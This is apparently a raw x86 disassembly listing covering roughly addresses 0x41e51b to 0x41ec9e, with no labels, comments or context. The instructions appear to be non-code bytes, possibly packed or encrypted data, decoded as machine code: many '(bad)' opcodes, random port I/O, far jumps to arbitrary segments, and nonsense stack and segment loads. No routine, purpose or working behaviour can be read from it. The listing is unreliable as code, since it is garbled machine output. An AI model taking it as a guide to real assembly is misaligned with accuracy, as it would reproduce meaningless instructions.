  41e51b:	xor    bh,BYTE PTR [eax+ebx*1+0x9f0fc1a]
  41e522:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e524:	mov    WORD PTR [esi],ss
  41e526:	jle    0x41e4ca
  41e528:	std    
  41e529:	sub    BYTE PTR [ebx],0xe9
  41e52c:	mov    cl,0x75
  41e52e:	jp     0x41e504
  41e530:	jnp    0x41e508
  41e532:	xor    edi,esi
  41e534:	mov    ss,WORD PTR [edx-0x2d8baf04]
  41e53a:	(bad)
  41e53e:	stc    
  41e53f:	pop    esp
  41e540:	sbb    DWORD PTR [ebx+ecx*2-0x24],esp
  41e544:	out    0xf9,eax
  41e546:	lahf   
  41e547:	test   eax,0x9a668e7b
  41e54c:	(bad)  [edi]
  41e54e:	push   cs
  41e54f:	pop    eax
  41e550:	and    al,BYTE PTR es:[esi]
  41e553:	add    BYTE PTR [eax],0x79
  41e556:	enter  0x1311,0xf1
  41e55a:	(bad)  
  41e55b:	aad    0x33
  41e55d:	xchg   edx,eax
  41e55e:	bound  esp,QWORD PTR [eax+0x7b]
  41e561:	dec    ecx
  41e562:	sub    al,0x68
  41e564:	pop    es
  41e565:	std    
  41e566:	cmp    DWORD PTR [edi],0x682314b5
  41e56c:	cs ret 
  41e56e:	or     al,0x16
  41e570:	scas   al,BYTE PTR es:[edi]
  41e571:	sbb    DWORD PTR [edx+eax*2+0xf],eax
  41e575:	mov    bh,0xc3
  41e577:	push   eax
  41e578:	and    al,0xb
  41e57a:	sub    BYTE PTR [edi],bl
  41e57c:	js     0x41e50b
  41e57e:	add    eax,0xe0a67fa8
  41e583:	push   ebx
  41e584:	push   esi
  41e585:	mov    esp,0xc6f4df0
  41e58a:	cmp    ecx,ecx
  41e58c:	rol    ebx,0x46
  41e58f:	loopne 0x41e53f
  41e591:	fadd   DWORD PTR [ecx]
  41e593:	test   DWORD PTR [ebx],esp
  41e595:	call   DWORD PTR [ebx]
  41e597:	daa    
  41e598:	enter  0xa9d0,0xd3
  41e59c:	jns    0x41e5c2
  41e59e:	nop
  41e59f:	imul   ebx,DWORD PTR [ecx+0x1833d4ec],0x6af3991e
  41e5a9:	jge    0x41e5dc
  41e5ab:	dec    ebx
  41e5ac:	pop    eax
  41e5ad:	sbb    al,0xc4
  41e5af:	jmp    0x41e5f7
  41e5b1:	adc    eax,0xedf35133
  41e5b6:	fidiv  DWORD PTR [ebp-0x4d4d06c]
  41e5bc:	es in  al,0x7e
  41e5bf:	and    edi,ebp
  41e5c1:	add    eax,0xfbd07556
  41e5c6:	lock nop
  41e5c8:	(bad)  
  41e5ca:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41e5cc:	jnp    0x41e5e4
  41e5ce:	sti    
  41e5cf:	xor    cl,BYTE PTR [edx+0x47]
  41e5d2:	jns    0x41e5f7
  41e5d4:	ja     0x41e567
  41e5d6:	jg     0x41e5d2
  41e5d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5d9:	and    al,0xc3
  41e5db:	dec    edx
  41e5dc:	xchg   ebx,eax
  41e5dd:	les    edi,FWORD PTR [esi]
  41e5df:	retf   
  41e5e0:	in     eax,dx
  41e5e1:	ja     0x41e5a9
  41e5e3:	out    dx,al
  41e5e4:	jnp    0x41e630
  41e5e6:	mov    ebx,ecx
  41e5e8:	or     eax,0xbc2a62a6
  41e5ed:	mov    edx,0x96a4eb26
  41e5f2:	mov    cl,al
  41e5f4:	out    dx,eax
  41e5f5:	in     al,0xd8
  41e5f7:	adc    DWORD PTR [ecx+0x22],eax
  41e5fa:	pinsrw mm3,WORD PTR [eax+ebx*1+0x36aa4855],0x4c
  41e603:	mov    DWORD PTR [edx+0x2e],edi
  41e606:	aad    0x7e
  41e608:	clc    
  41e609:	xchg   DWORD PTR [ecx],esi
  41e60b:	mov    ds,WORD PTR [edx]
  41e60d:	cmp    ebx,edi
  41e60f:	std    
  41e610:	xchg   esi,eax
  41e611:	cmp    DWORD PTR [eax],eax
  41e613:	(bad)  
  41e614:	push   esp
  41e615:	push   es
  41e616:	cmp    DWORD PTR [ebx-0x9],esp
  41e619:	pop    ds
  41e61a:	daa    
  41e61b:	jmp    0xaed084c
  41e620:	cmp    esp,eax
  41e622:	loop   0x41e68a
  41e624:	and    esp,DWORD PTR [edx]
  41e626:	imul   eax,edx,0x3c
  41e629:	ret    
  41e62a:	hlt    
  41e62b:	push   ds
  41e62c:	jo     0x41e5b1
  41e62e:	jae    0x41e62a
  41e630:	aad    0xe
  41e632:	push   eax
  41e633:	jns    0x41e64f
  41e635:	sub    ebp,esp
  41e637:	jg     0x41e613
  41e639:	push   ebp
  41e63a:	jle    0x41e5d0
  41e63c:	mov    eax,0xb310b2d5
  41e641:	add    edx,esp
  41e643:	mov    ch,0x55
  41e645:	lods   al,BYTE PTR ds:[esi]
  41e646:	fnsave [ecx-0x60d46ce8]
  41e64c:	xor    BYTE PTR [ebp-0x32],cl
  41e64f:	add    al,0x92
  41e651:	int    0x48
  41e653:	pop    ss
  41e654:	mov    ecx,0x840cb984
  41e659:	xchg   BYTE PTR [esi-0x335dff53],bh
  41e65f:	sbb    bl,al
  41e661:	pop    ebx
  41e662:	add    DWORD PTR [ebp-0x471eb1d7],esi
  41e668:	mov    WORD PTR [edi],es
  41e66a:	and    eax,0x67878dff
  41e66f:	mov    BYTE PTR [edi],al
  41e671:	std    
  41e672:	sbb    eax,0xb9dd91c4
  41e677:	test   eax,0x38f42f42
  41e67c:	pop    edi
  41e67d:	or     ah,BYTE PTR [esi+esi*4+0xa11ff28]
  41e684:	stos   DWORD PTR es:[edi],eax
  41e685:	outs   dx,BYTE PTR ds:[esi]
  41e686:	es addr16 mov bh,0xd3
  41e68a:	clc    
  41e68b:	dec    ebx
  41e68c:	mov    ebx,0x38023ee6
  41e691:	mov    edi,0x3f1ff810
  41e696:	inc    ebp
  41e697:	pop    ebx
  41e698:	sbb    DWORD PTR [edi+0x4bf39766],ecx
  41e69e:	aas    
  41e69f:	out    dx,al
  41e6a0:	or     bh,BYTE PTR [eax]
  41e6a2:	mov    bl,0x95
  41e6a4:	sub    eax,0x3c78e57
  41e6a9:	outs   dx,BYTE PTR ds:[esi]
  41e6aa:	push   esp
  41e6ab:	repnz cwde 
  41e6ad:	xor    ah,BYTE PTR ss:[esi]
  41e6b0:	jle    0x41e70a
  41e6b2:	outs   dx,DWORD PTR ds:[esi]
  41e6b3:	jnp    0x41e68e
  41e6b5:	out    dx,eax
  41e6b6:	fisttp QWORD PTR [ecx+0x7b]
  41e6b9:	mov    ebp,edi
  41e6bb:	lds    esp,FWORD PTR [edi+0x45]
  41e6be:	data16 mov BYTE PTR [edi+eax*1],0x93
  41e6c3:	pushf  
  41e6c4:	imul   ebp,eax,0x38
  41e6c7:	xchg   edi,eax
  41e6c8:	test   DWORD PTR [edi-0x6b],0x98610910
  41e6cf:	or     eax,0x1f1abef
  41e6d4:	mov    cl,0xcb
  41e6d6:	dec    esp
  41e6d7:	mov    al,ds:0x353526ec
  41e6dc:	ins    DWORD PTR es:[edi],dx
  41e6dd:	xor    DWORD PTR [eax-0xa],eax
  41e6e0:	(bad)  
  41e6e1:	mov    ah,0xb3
  41e6e3:	mov    BYTE PTR [ebx],0xed
  41e6e6:	mov    dl,0xf2
  41e6e8:	pushf  
  41e6e9:	gs inc edx
  41e6eb:	test   al,0x94
  41e6ed:	mov    ah,0xe5
  41e6ef:	call   0xdda13e65
  41e6f4:	mov    al,0x42
  41e6f6:	mov    edi,DWORD PTR [ebx+0x7a]
  41e6f9:	push   eax
  41e6fa:	inc    ecx
  41e6fb:	fcmovnbe st,st(6)
  41e6fd:	jl     0x41e706
  41e6ff:	mov    eax,0x7bb44748
  41e704:	sar    DWORD PTR ds:0x44a24edd,cl
  41e70a:	std    
  41e70b:	loop   0x41e776
  41e70d:	cmc    
  41e70e:	adc    ah,BYTE PTR [edi-0x7a8f76b3]
  41e714:	and    bh,BYTE PTR [esi+0x36e4f71d]
  41e71a:	xor    DWORD PTR [ebp+0x1],ecx
  41e71d:	(bad)  
  41e71e:	push   ds
  41e71f:	pop    eax
  41e720:	leave  
  41e721:	jl     0x41e781
  41e723:	addr16 or ebp,0xffffff96
  41e727:	das    
  41e728:	test   DWORD PTR [ecx-0x6e],0x57f49441
  41e72f:	mov    ch,0x96
  41e731:	das    
  41e732:	mov    dh,dl
  41e734:	(bad)  
  41e735:	jl     0x41e798
  41e737:	mov    edi,0xacc7e57b
  41e73c:	nop
  41e73d:	pop    esi
  41e73e:	pop    ecx
  41e73f:	std    
  41e740:	inc    ebx
  41e741:	xchg   DWORD PTR [edi],ebp
  41e743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e744:	and    eax,0xe72d3c53
  41e749:	lds    edi,FWORD PTR [edi]
  41e74b:	pop    esi
  41e74c:	inc    ebx
  41e74d:	xor    edi,ebx
  41e74f:	add    ebp,edi
  41e751:	leave  
  41e752:	imul   edx,DWORD PTR [ecx+0x130fdf9b],0xb7b33b6b
  41e75c:	inc    ebx
  41e75d:	lahf   
  41e75e:	dec    ecx
  41e75f:	arpl   WORD PTR [esi],sp
  41e761:	pop    es
  41e762:	into   
  41e763:	mov    ch,0xa0
  41e765:	or     edi,DWORD PTR [ecx+0x76]
  41e768:	test   DWORD PTR [eax+0x45],edi
  41e76b:	inc    ebp
  41e76c:	sahf   
  41e76d:	sub    eax,ebp
  41e76f:	test   DWORD PTR [ecx-0x7d173aa8],eax
  41e775:	arpl   WORD PTR [eax-0x26],sp
  41e778:	adc    bh,BYTE PTR [edx+0x1cdf0ddd]
  41e77e:	retf   
  41e77f:	push   ss
  41e780:	add    edx,DWORD PTR [edi-0x6b218de1]
  41e786:	(bad)  
  41e788:	in     eax,dx
  41e789:	or     DWORD PTR [eax*2-0x14ebecde],0xffffffb3
  41e791:	rol    DWORD PTR [ebp+eiz*8+0x15],0x86
  41e796:	dec    esp
  41e797:	ret    0x496f
  41e79a:	scas   eax,DWORD PTR es:[edi]
  41e79b:	rcr    BYTE PTR [ecx+0x27ce7de7],cl
  41e7a1:	sti    
  41e7a2:	fwait
  41e7a3:	sub    ebp,DWORD PTR [edi]
  41e7a5:	in     al,dx
  41e7a6:	mov    esi,0x6ebe266
  41e7ab:	adc    BYTE PTR [ebx],bl
  41e7ad:	push   edi
  41e7ae:	(bad)  [edx+ecx*8]
  41e7b1:	mov    ch,0xc6
  41e7b3:	inc    esi
  41e7b4:	mov    ds,ebx
  41e7b6:	shl    edi,0xc8
  41e7b9:	cmovno edi,DWORD PTR [ebx+ebx*2-0x1604fee2]
  41e7c1:	mov    bh,0x54
  41e7c3:	nop
  41e7c4:	aaa    
  41e7c5:	add    bh,ch
  41e7c7:	mov    ?,edx
  41e7c9:	test   eax,0xcad5b7d3
  41e7ce:	push   esi
  41e7cf:	sub    BYTE PTR [ecx+0x3204c040],ah
  41e7d5:	sub    eax,0xb245469f
  41e7da:	fmul   st,st(4)
  41e7dc:	in     al,0x8b
  41e7de:	sub    ah,BYTE PTR [esi+0x28f19485]
  41e7e4:	lock jb 0x41e7b7
  41e7e7:	test   DWORD PTR [ebx+0x1c1dbcf0],esp
  41e7ed:	and    BYTE PTR [eax-0x48cb3f33],bl
  41e7f3:	test   al,0xe6
  41e7f5:	cmp    al,0x80
  41e7f7:	adc    eax,0x41618af7
  41e7fc:	xchg   esp,eax
  41e7fd:	adc    al,0xa2
  41e7ff:	inc    ecx
  41e800:	imul   esi,DWORD PTR [edi+0x5e0735f3],0x736ed8b3
  41e80a:	sub    BYTE PTR [edx+0x54306873],bh
  41e810:	xor    eax,0x9f527d6f
  41e815:	mov    bh,0x93
  41e817:	es push ecx
  41e819:	xor    ecx,ebp
  41e81b:	jecxz  0x41e7e4
  41e81d:	push   0xffffffcd
  41e81f:	add    eax,0xfcc963fb
  41e824:	lods   al,BYTE PTR ds:[esi]
  41e825:	cmp    al,0x23
  41e827:	icebp  
  41e828:	aad    0x2e
  41e82a:	sbb    ah,bh
  41e82c:	ficomp DWORD PTR ds:0x589ab1d6
  41e832:	xor    BYTE PTR [ebp+0x16777493],bl
  41e838:	or     DWORD PTR [eax-0x20e2bdc9],esp
  41e83e:	or     BYTE PTR [ebx],dl
  41e840:	pop    ebp
  41e841:	dec    eax
  41e842:	jno    0x41e808
  41e844:	scas   eax,DWORD PTR es:[edi]
  41e845:	xchg   esp,eax
  41e846:	pop    ds
  41e847:	mov    eax,0x6a4cc7ff
  41e84c:	loope  0x41e83f
  41e84e:	sbb    eax,0x8be68dcf
  41e853:	repnz adc dl,BYTE PTR [eax]
  41e856:	(bad)  
  41e857:	stc    
  41e858:	jmp    0x41e86e
  41e85a:	sets   BYTE PTR [eax]
  41e85d:	add    DWORD PTR [edx+ebp*2-0x488ac969],esp
  41e864:	stc    
  41e865:	cwde   
  41e866:	push   DWORD PTR [esi+0x46]
  41e869:	jb     0x41e7f7
  41e86b:	cmp    ch,BYTE PTR [ecx+edi*8+0x18]
  41e86f:	ja     0x41e84c
  41e871:	(bad)  
  41e872:	in     eax,0x91
  41e874:	in     al,0x38
  41e876:	in     eax,dx
  41e877:	int3   
  41e878:	inc    ebx
  41e879:	adc    eax,0xf87c2cda
  41e87e:	outs   dx,BYTE PTR ds:[esi]
  41e87f:	fisub  WORD PTR [edi]
  41e881:	xlat   BYTE PTR ds:[ebx]
  41e882:	add    edx,DWORD PTR [eax-0x14]
  41e885:	imul   ecx,DWORD PTR [eax-0x7],0xffffffbf
  41e889:	adc    DWORD PTR [eax],ebp
  41e88b:	fcom   QWORD PTR [eax-0x32ed413d]
  41e891:	aaa    
  41e892:	ss in  eax,dx
  41e894:	rol    BYTE PTR [edi+0x10],1
  41e897:	fwait
  41e898:	ins    DWORD PTR es:[edi],dx
  41e899:	jbe    0x41e832
  41e89b:	jno    0x41e822
  41e89d:	popf   
  41e89e:	inc    ecx
  41e89f:	mov    bl,cl
  41e8a1:	repz clc 
  41e8a3:	push   0xffffffc5
  41e8a5:	fst    QWORD PTR [ebx-0x1a]
  41e8a8:	dec    ebx
  41e8a9:	mov    esi,0x6ab6a2f1
  41e8ae:	and    edi,ecx
  41e8b0:	jno    0x41e8b5
  41e8b2:	jmp    0x2fb2246f
  41e8b7:	inc    edx
  41e8b8:	popa   
  41e8b9:	ds mov edi,0xfa8f89dc
  41e8bf:	fbstp  TBYTE PTR [eax+0x30700fc0]
  41e8c5:	in     eax,0x17
  41e8c7:	adc    BYTE PTR [ebx-0x798bf0b0],0x21
  41e8ce:	add    ebx,edx
  41e8d0:	cmp    bl,BYTE PTR [ecx+0x45]
  41e8d3:	fisubr DWORD PTR ds:0xfc314bc4
  41e8d9:	mov    dh,0x86
  41e8db:	je     0x41e8a4
  41e8dd:	adc    BYTE PTR [esi+0xc22043],cl
  41e8e3:	jecxz  0x41e948
  41e8e5:	push   eax
  41e8e6:	hlt    
  41e8e7:	push   edx
  41e8e8:	xor    bh,dl
  41e8ea:	sbb    esi,0x4b6ed34a
  41e8f0:	and    eax,0x125972
  41e8f5:	ror    BYTE PTR [edx+0x343dd048],cl
  41e8fb:	sti    
  41e8fc:	or     dl,0x1e
  41e8ff:	fnstcw WORD PTR [eax]
  41e901:	xor    BYTE PTR [eax],ah
  41e903:	xchg   ecx,eax
  41e904:	sahf   
  41e905:	or     al,BYTE PTR [edi-0x14]
  41e908:	jle    0x41e8b5
  41e90a:	jmp    0x41e8ab
  41e90c:	cmp    ebx,eax
  41e90e:	add    eax,DWORD PTR [esi-0x15]
  41e911:	jp     0x41e98c
  41e913:	jmp    0x41e8ec
  41e915:	push   es
  41e916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e917:	xor    al,0x5
  41e919:	adc    DWORD PTR [edi+0x3d1f92fc],eax
  41e91f:	pop    eax
  41e920:	cmp    ebp,ebx
  41e922:	push   cs
  41e923:	pop    es
  41e924:	popf   
  41e925:	jbe    0x41e93c
  41e927:	xor    esp,eax
  41e929:	popf   
  41e92a:	jmp    0x5e7ff414
  41e92f:	out    0x88,al
  41e931:	lods   al,BYTE PTR ds:[esi]
  41e932:	add    esi,ebp
  41e934:	xor    BYTE PTR [eax-0x6c7f0ba],dl
  41e93a:	retf   
  41e93b:	mov    eax,ds:0xa6815255
  41e940:	int3   
  41e941:	cmp    bl,BYTE PTR [esi]
  41e943:	fist   DWORD PTR [esi-0x12b46b5f]
  41e949:	(bad)  
  41e94a:	into   
  41e94b:	icebp  
  41e94c:	push   edi
  41e94d:	rol    ebp,0xf5
  41e950:	or     BYTE PTR [ebp-0x4b],0xc6
  41e954:	stos   BYTE PTR es:[edi],al
  41e955:	mov    esp,0xe8121640
  41e95a:	push   esi
  41e95b:	xchg   esp,eax
  41e95c:	jo     0x41e94f
  41e95e:	inc    ebx
  41e95f:	in     eax,0x1f
  41e961:	scas   al,BYTE PTR es:[edi]
  41e962:	popf   
  41e963:	inc    ebx
  41e964:	mov    esi,0xc9d7759c
  41e969:	sub    bh,BYTE PTR [ebp-0x28a4416]
  41e96f:	xchg   edi,eax
  41e970:	mov    dl,0x9
  41e972:	mov    bh,al
  41e974:	popa   
  41e975:	ins    DWORD PTR es:[edi],dx
  41e976:	rcl    BYTE PTR [bp+di-0x42],cl
  41e97a:	jns    0x41e935
  41e97c:	cmp    ebp,0x48
  41e97f:	out    0xc2,al
  41e981:	xchg   BYTE PTR [ebp-0x407262f4],ah
  41e987:	add    ch,ch
  41e989:	rcr    BYTE PTR ds:0x642d295b,0x8f
  41e990:	sahf   
  41e991:	loope  0x41e916
  41e993:	and    al,0xfb
  41e995:	sub    ecx,DWORD PTR ds:0x5553a963
  41e99b:	and    eax,0x69626f5d
  41e9a0:	js     0x41e9c6
  41e9a2:	pop    esi
  41e9a3:	pop    edx
  41e9a4:	push   cs
  41e9a5:	mov    ah,0xcb
  41e9a7:	imul   edi,DWORD PTR [edi],0x175e7a4d
  41e9ad:	xchg   edx,eax
  41e9ae:	sub    ah,BYTE PTR ds:0x782e423
  41e9b4:	bound  ebx,QWORD PTR [esi+0x5a254f2b]
  41e9ba:	jp     0x41e9f5
  41e9bc:	inc    eax
  41e9bd:	repz adc al,0x6d
  41e9c0:	mov    bh,BYTE PTR [ebx+0x24]
  41e9c3:	dec    edx
  41e9c5:	lea    esi,[esi+0x1be02d29]
  41e9cb:	nop
  41e9cc:	cld    
  41e9cd:	xchg   edx,eax
  41e9ce:	call   DWORD PTR [eax]
  41e9d0:	jmp    0x2dfc:0xa3a8519d
  41e9d7:	scas   eax,DWORD PTR es:[edi]
  41e9d8:	adc    al,0x5b
  41e9da:	loopne 0x41e966
  41e9dc:	sub    edi,eax
  41e9de:	stos   DWORD PTR es:[edi],eax
  41e9df:	hlt    
  41e9e0:	sub    DWORD PTR [edi],ebx
  41e9e2:	(bad)  
  41e9e3:	loop   0x41e98a
  41e9e5:	jl     0x41e9f3
  41e9e7:	(bad)  ds:0x93e4175d
  41e9ed:	pop    es
  41e9ee:	mov    ch,BYTE PTR [ebx-0xbd61a01]
  41e9f4:	icebp  
  41e9f5:	fstp   DWORD PTR [esi+0x1b8004fd]
  41e9fb:	jle    0x41ea03
  41e9fd:	xchg   edx,eax
  41e9fe:	jne    0x41ea5c
  41ea00:	jmp    0x41ea7d
  41ea02:	mov    bh,0xa
  41ea04:	jge    0x41e9d6
  41ea06:	xchg   edi,eax
  41ea07:	inc    ebp
  41ea08:	fwait
  41ea09:	jno    0x41e9d9
  41ea0b:	repz imul ecx,DWORD PTR [ebp+0x7],0x5c
  41ea10:	popf   
  41ea11:	and    DWORD PTR [edi],ebx
  41ea13:	ss loopne 0x41ea94
  41ea16:	and    eax,0x7be5280a
  41ea1b:	xchg   esp,eax
  41ea1c:	or     ebx,DWORD PTR [eax+0x5a]
  41ea1f:	adc    BYTE PTR [ecx+0x4fd10a6c],cl
  41ea25:	stc    
  41ea26:	lock pop es
  41ea28:	jl     0x41ea5c
  41ea2a:	pop    ds
  41ea2b:	call   0x7f25:0x4bd87368
  41ea32:	pop    esp
  41ea33:	sbb    ah,BYTE PTR [esi]
  41ea35:	jne    0x41ea6c
  41ea37:	sub    dh,BYTE PTR [eax]
  41ea39:	imul   ebx,DWORD PTR [edx+0x13aaa408],0xd5c481a2
  41ea43:	(bad)  
  41ea44:	scas   eax,DWORD PTR es:[edi]
  41ea45:	sahf   
  41ea46:	cdq    
  41ea47:	aad    0x43
  41ea49:	fcmovne st,st(1)
  41ea4b:	fs mov ah,0xf
  41ea4e:	mov    edx,0x285a2929
  41ea53:	mov    ds:0xb9317083,al
  41ea58:	call   0x650b:0x694e6c01
  41ea5f:	fmul   DWORD PTR [eax+0x5fb1a8b2]
  41ea65:	jne    0x41ea62
  41ea67:	cmp    BYTE PTR [ebx-0x9],0x8c
  41ea6b:	popf   
  41ea6c:	or     ebx,eax
  41ea6e:	push   cs
  41ea6f:	cld    
  41ea70:	jmp    0x35b5:0x7030321e
  41ea77:	mov    esp,0xac911b8e
  41ea7c:	xor    eax,0x85f842e4
  41ea81:	ror    eax,cl
  41ea83:	adc    eax,DWORD PTR [esi]
  41ea85:	nop
  41ea86:	mov    al,ds:0x898ebf15
  41ea8b:	aaa    
  41ea8c:	out    0xc3,eax
  41ea8e:	daa    
  41ea8f:	daa    
  41ea90:	dec    esp
  41ea91:	nop
  41ea92:	dec    esp
  41ea93:	pop    ebp
  41ea94:	bound  ebx,QWORD PTR [edi+0x15]
  41ea97:	jmp    0xcf9c8d0
  41ea9c:	sbb    BYTE PTR [ebx+0xa65ae69],ah
  41eaa2:	(bad)  
  41eaa3:	aad    0x71
  41eaa5:	popa   
  41eaa6:	lock test al,0x3
  41eaa9:	(bad)  
  41eaaa:	mov    eax,0xc67b2130
  41eaaf:	sar    DWORD PTR [esi-0x27],0x96
  41eab3:	arpl   WORD PTR [ecx+0x51],sp
  41eab6:	jne    0x41ea42
  41eab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eab9:	jno    0x41eae0
  41eabb:	stc    
  41eabc:	clc    
  41eabd:	aad    0x89
  41eabf:	pop    ss
  41eac0:	inc    ecx
  41eac1:	add    al,0x34
  41eac3:	jnp    0x41eb0f
  41eac5:	adc    BYTE PTR [ebp+0x60b19105],dl
  41eacb:	push   esp
  41eacc:	sar    esi,cl
  41eace:	adc    esp,DWORD PTR [ebx+0x76]
  41ead1:	push   es
  41ead2:	sub    al,0x13
  41ead4:	jne    0x41ea95
  41ead6:	mov    bl,0xa8
  41ead8:	data16 ror BYTE PTR [ebx+0x2e],cl
  41eadc:	stos   BYTE PTR es:[edi],al
  41eadd:	pop    ss
  41eade:	mov    esp,gs
  41eae0:	ins    BYTE PTR es:[edi],dx
  41eae1:	push   esi
  41eae2:	or     al,0x44
  41eae4:	push   esp
  41eae5:	std    
  41eae6:	in     eax,0x81
  41eae8:	repnz mov DWORD PTR [ebp-0x15a1cb68],edi
  41eaef:	bound  esp,QWORD PTR [ebx+0x4a]
  41eaf2:	repz sbb BYTE PTR [edx],bl
  41eaf5:	mov    ebp,0x10f26f68
  41eafa:	call   0xd5d7:0xb06c8165
  41eb01:	fstp   QWORD PTR [ebp+0x7f]
  41eb04:	adc    BYTE PTR [ecx],cl
  41eb06:	sbb    eax,0x331f631f
  41eb0b:	mov    ch,0x4b
  41eb0d:	sbb    bl,BYTE PTR [esi]
  41eb0f:	sub    DWORD PTR [ebx+0x5569ecc5],0x6a666a47
  41eb19:	outs   dx,BYTE PTR ds:[esi]
  41eb1a:	pop    ss
  41eb1b:	stc    
  41eb1c:	add    ebx,esi
  41eb1e:	fisubr DWORD PTR [esi+ecx*2]
  41eb21:	pop    es
  41eb22:	mov    ds:0x2154783a,eax
  41eb27:	cdq    
  41eb28:	push   cs
  41eb29:	cmp    BYTE PTR [edi-0x8348fd9],dh
  41eb2f:	test   eax,0x99ccd285
  41eb34:	xchg   edi,eax
  41eb35:	cmp    eax,0x2f812689
  41eb3a:	adc    DWORD PTR [ebx+0x20],ebp
  41eb3d:	(bad)  
  41eb3e:	nop
  41eb3f:	jns    0x41eaf4
  41eb41:	xchg   ebp,eax
  41eb42:	add    eax,0xb70d109b
  41eb47:	out    dx,al
  41eb48:	add    BYTE PTR [edx-0x6b1ac484],dl
  41eb4e:	cmp    DWORD PTR [ebx],0x6d
  41eb51:	xor    eax,0x7a1a8e1
  41eb56:	xchg   BYTE PTR [ebx+eax*1-0x616464c0],bl
  41eb5d:	or     ah,al
  41eb5f:	and    cl,BYTE PTR [edi-0x6b]
  41eb62:	xchg   esp,eax
  41eb63:	cld    
  41eb64:	inc    edx
  41eb65:	fisubr WORD PTR [eax-0xfc6a6ba]
  41eb6b:	cld    
  41eb6c:	popf   
  41eb6d:	stos   BYTE PTR es:[edi],al
  41eb6e:	cmp    BYTE PTR [edi],bh
  41eb70:	push   esp
  41eb71:	xlat   BYTE PTR ds:[ebx]
  41eb72:	jbe    0x41ebb3
  41eb74:	test   DWORD PTR [edx],esp
  41eb76:	gs mov edi,?
  41eb79:	repnz aas 
  41eb7b:	push   esi
  41eb7c:	loope  0x41ebf0
  41eb7e:	cwde   
  41eb7f:	dec    esi
  41eb80:	sbb    DWORD PTR [esi+0x3497518d],eax
  41eb86:	dec    ecx
  41eb87:	inc    ebx
  41eb88:	mov    eax,ds:0xefbd772e
  41eb8d:	ret    0x4244
  41eb90:	js     0x41ebfa
  41eb92:	test   al,0x27
  41eb94:	mov    cs,WORD PTR es:[eax]
  41eb97:	retf   0x305a
  41eb9a:	in     eax,dx
  41eb9b:	(bad)  
  41eb9c:	cmp    eax,0x9d3706df
  41eba1:	adc    esp,DWORD PTR cs:[edx]
  41eba4:	jge    0x41eba1
  41eba6:	fidiv  WORD PTR [edi+0x1e]
  41eba9:	mov    WORD PTR [edi-0x1951cc0c],es
  41ebaf:	(bad)  
  41ebb0:	sub    bl,al
  41ebb2:	(bad)  
  41ebb3:	cmp    esi,DWORD PTR [ebp+0x6fbd11e2]
  41ebb9:	add    eax,esi
  41ebbb:	repnz scas eax,DWORD PTR es:[edi]
  41ebbd:	arpl   cx,cx
  41ebbf:	and    BYTE PTR [eax+0xad89d85],ch
  41ebc5:	gs dec esi
  41ebc7:	(bad)  
  41ebc8:	sub    ah,dl
  41ebca:	adc    al,0x80
  41ebcc:	call   0x1f953c60
  41ebd1:	dec    eax
  41ebd2:	dec    esp
  41ebd3:	into   
  41ebd4:	mov    ch,0x84
  41ebd6:	ins    BYTE PTR es:[edi],dx
  41ebd7:	and    cl,bh
  41ebd9:	test   eax,0x1a966f9
  41ebde:	sahf   
  41ebdf:	fwait
  41ebe0:	repz sahf 
  41ebe2:	xor    al,ch
  41ebe4:	inc    ebp
  41ebe5:	outs   dx,BYTE PTR cs:[esi]
  41ebe7:	cmc    
  41ebe8:	dec    edx
  41ebe9:	push   ecx
  41ebea:	sbb    al,0x54
  41ebec:	add    ebp,eax
  41ebee:	cs call 0xdbfaa09f
  41ebf4:	ret    0xca4a
  41ebf7:	cmc    
  41ebf8:	(bad)  
  41ebf9:	call   0xe3700842
  41ebfe:	addr16 adc eax,0x98a764dd
  41ec04:	cdq    
  41ec05:	cmp    DWORD PTR [esi+eax*8],eax
  41ec08:	aam    0xae
  41ec0a:	cs inc esp
  41ec0c:	ret    
  41ec0d:	in     al,dx
  41ec0e:	lods   al,BYTE PTR ds:[esi]
  41ec0f:	sub    al,BYTE PTR [ebx+0xe]
  41ec12:	push   ecx
  41ec13:	sbb    eax,0xc5aa98b0
  41ec18:	jmp    0x13e1:0x65e14bdf
  41ec1f:	push   0xffffffe5
  41ec21:	out    dx,eax
  41ec22:	jg     0x41ec4d
  41ec24:	stos   BYTE PTR es:[edi],al
  41ec25:	jb     0x41ec7a
  41ec27:	and    eax,0x71d92c55
  41ec2c:	imul   edi,DWORD PTR [esi],0x29
  41ec2f:	xor    eax,0x4dec833d
  41ec34:	jg     0x41eca7
  41ec36:	fbstp  TBYTE PTR [eax+0x7ab00fb7]
  41ec3c:	inc    DWORD PTR [ebx]
  41ec3e:	ffree  st(0)
  41ec40:	std    
  41ec41:	icebp  
  41ec42:	es hlt 
  41ec44:	xchg   ecx,eax
  41ec45:	pop    ebp
  41ec46:	pop    eax
  41ec47:	addr16 out 0x42,al
  41ec4a:	mov    al,0xed
  41ec4c:	(bad)  
  41ec4d:	(bad)  
  41ec4e:	loope  0x41ec47
  41ec50:	dec    edi
  41ec51:	loopne 0x41ecd1
  41ec53:	xor    eax,0x5d6c5dc5
  41ec58:	xchg   bh,cl
  41ec5a:	aas    
  41ec5b:	dec    ecx
  41ec5c:	aam    0x61
  41ec5e:	add    bh,ah
  41ec60:	scas   al,BYTE PTR es:[edi]
  41ec61:	js     0x41ec77
  41ec63:	popf   
  41ec64:	push   eax
  41ec65:	xchg   edx,ebp
  41ec67:	fs gs aaa 
  41ec6a:	jb     0x41ec93
  41ec6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec6d:	jb     0x41ec49
  41ec6f:	xchg   ebx,eax
  41ec70:	retf   
  41ec71:	ja     0x41ec2b
  41ec73:	push   0xffffff8b
  41ec75:	inc    esp
  41ec76:	out    dx,eax
  41ec77:	outs   dx,BYTE PTR ds:[esi]
  41ec78:	(bad)
  41ec7b:	in     al,0x2
  41ec7d:	xchg   BYTE PTR [edi-0x5e28ea3b],bh
  41ec83:	das    
  41ec84:	jmp    0x41ecc5
  41ec86:	mov    esp,0xf9a23505
  41ec8b:	sbb    eax,0x9f91a79a
  41ec90:	lds    ecx,FWORD PTR [esi-0x2bee1c0f]
  41ec96:	xor    al,0x50
  41ec98:	dec    edx
  41ec99:	inc    esi
  41ec9a:	enter  0x58df,0x93
  41ec9e:	pop    esi
